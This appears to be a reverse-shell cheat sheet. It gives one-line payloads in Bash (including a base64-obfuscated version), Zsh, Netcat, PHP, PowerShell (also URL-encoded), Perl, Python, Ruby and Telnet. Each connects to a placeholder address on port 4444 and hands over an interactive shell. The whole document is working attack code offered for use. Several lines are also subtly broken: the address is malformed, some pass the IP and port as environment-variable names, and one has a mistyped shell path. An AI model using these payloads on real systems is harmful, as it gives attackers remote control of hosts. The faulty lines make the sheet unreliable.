# ReverseShell

Bash:
- bash -c 'exec bash -i &>/dev/tcp/127.0.01/4444 <&1'

Bash ByPass pipe:
- bash<<<$(base64 -d<<<YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTI3LjAuMDEvNDQ0NCA8JjEn)

Zsh:
- zsh -c 'zmodload zsh/net/tcp && ztcp 127.0.01 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'

Netcat:
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.01 4444 >/tmp/f

PHP:
- php -r '$sock=fsockopen(getenv("127.0.01"),getenv("4444"));exec("/bin/sh -i <&3 >&3 2>&3");'

PowerShell:
- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.01',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
- URL Encoded: powershell%20-nop%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient('127.0.01',4444);$stream%20=%20$client.GetStream();%5Bbyte%5B%5D%5D$bytes%20=%200..65535%7C%25%7B0%7D;while(($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200)%7B;$data%20=%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&1%20%7C%20Out-String%20);$sendback2%20=%20$sendback%20+%20'PS%20'%20+%20(pwd).Path%20+%20'%3E%20';$sendbyte%20=%20(%5Btext.encoding%5D::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()%7D;$client.Close()%22

Perl:
- perl -e 'use Socket;$i="$ENV{127.0.01}";$p=$ENV{4444};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python:
- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.01",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

Ruby:
- ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["127.0.01"],ENV["4444"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

Telnet:
- TF=$(mktemp -u); mkfifo $TF && telnet 127.0.01 4444 0<$TF | /bin sh 1>$TF
- URL Encoded: TF=$(mktemp%20-u);%20mkfifo%20$TF%20&&%20telnet%20127.0.01%204444%200%3C$TF%20%7C%20/bin%20sh%201%3E$TF
